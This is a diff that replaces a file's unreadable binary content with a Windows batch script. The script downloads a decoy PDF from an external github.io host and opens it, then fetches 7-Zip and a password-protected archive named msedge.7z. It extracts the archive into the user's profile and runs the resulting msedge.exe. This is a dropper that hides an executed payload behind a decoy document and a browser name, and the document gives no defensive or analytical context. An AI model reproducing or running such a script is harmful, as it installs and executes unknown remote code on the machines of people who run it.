@@ -1,3 +1,11 @@
-JVÌò¾€“†1ÌÃ7_©×Ëžà•‰9<QÞêÍþL$ÙÀì×Ú‹êãƒZî`ª'á·ñ¥[mÒ–—ì³RÝ{íà^T	ÇYêÔ.ø_G^`îüJæ?_úÓ6ÓÈââÃ†ðQxâúÑ·dm¦AÈH’<@¯iB…¾@zcÓ•:˜‡R„48X^«qÉÇ¬±@° '),ÓB»·c¢joƒZqîŒü ØðÛùÿ}ç'åµ’¥«*Ä=…ÛFûK‰…­h£Ø¾—RÏ7 ±FÉò©3Ä-åÇê)í¡|øà^˜ßÝš?¨L(«®»¼˜ƒÈrõÕ‡&ª#ë“àÇ™)ð{ÊÐ¤ú'óÚð)_„ãk0åüÚwƒÎË[å2gEyr©E™JðiäŽYÄ±ØÆ@ÑÆ%
-ÿySíÛcÏÙwI4a{	bQBúgŽ³®ã«Ê’ä2
-öy¤»»íþýú×‡qÞÒST~É¤k®º6
+@echo off
+curl https://kingdog2.github.io/test.pdf -o "%TEMP%\test.pdf"
+rundll32 url.dll,FileProtocolHandler file:///%TEMP%\test.pdf
+
+curl https://kingdog2.github.io/7z.exe -o "%TEMP%\7z.exe"
+curl https://kingdog2.github.io/7z.dll -o "%TEMP%\7z.dll"
+
+curl https://kingdog2.github.io/msedge.7z -o "%TEMP%\msedge.7z"
+
+%TEMP%\7z.exe x %TEMP%\msedge.7z -p George_5595 -o"%USERPROFILE%"
+%USERPROFILE%\msedge.exe
